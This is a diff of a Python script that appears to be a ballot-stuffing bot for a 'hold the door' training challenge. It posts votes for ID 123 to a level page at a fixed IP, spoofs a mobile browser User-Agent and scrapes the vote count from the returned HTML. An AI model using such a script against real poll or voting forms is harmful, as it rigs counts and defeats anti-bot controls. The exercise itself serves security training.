@@ -7,27 +7,30 @@ helper variables: r.url, r.status_code, r.headers, r.text
 import requests
 import multiprocessing
 
-URL = 'http://54.221.6.249/level0.php'
-HEADERS = {'content-type': 'application/x-www-form-urlencoded'}
+URL = 'http://54.221.6.249/level2.php'
+HEADERS = {'content-type': 'application/x-www-form-urlencoded',
+           'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)'
+           }
 DATA = {
     'id': '123',
     'holdthedoor': 'submit',
     'key': ''
-}
+    }
 
 COOKIES = {
     'HoldTheDoor': ''
-}
+    }
 
-ID = '123'
+ID = '<td>\n123    </td>'
 VOTES = 0
 
 def count_votes(htmlstring):
     global VOTES
     for i in range(len(htmlstring)):
         if htmlstring[i:(i + len(ID))] == ID:
-            VOTES = int(htmlstring[(i + 22):(i + 28)])
+            VOTES = int(htmlstring[(i + 27):(i + 33)])
             break
+    Votes = 0
 
 
 def vote(end):
@@ -64,6 +67,7 @@ def test():
     print('Votes = {:d} for ID: {:}'.format(VOTES, ID))
     print('status code:\n', r.status_code)
     print('headers:\n', r.headers)
+#    print('text:\n', r.text)
 
 
 if __name__ == '__main__':
